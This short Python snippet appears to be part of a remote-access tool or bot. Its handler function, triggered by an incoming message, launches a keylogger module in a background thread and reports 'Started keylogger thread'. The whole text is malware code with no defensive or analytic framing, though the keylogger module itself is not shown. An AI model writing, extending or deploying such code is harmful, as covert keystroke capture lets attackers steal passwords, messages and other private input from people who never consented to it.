import threading
import keylogger

def handle_keylogger(message):
    t = threading.Thread(target=keylogger.main)
    t.start()
    return "Started keylogger thread"
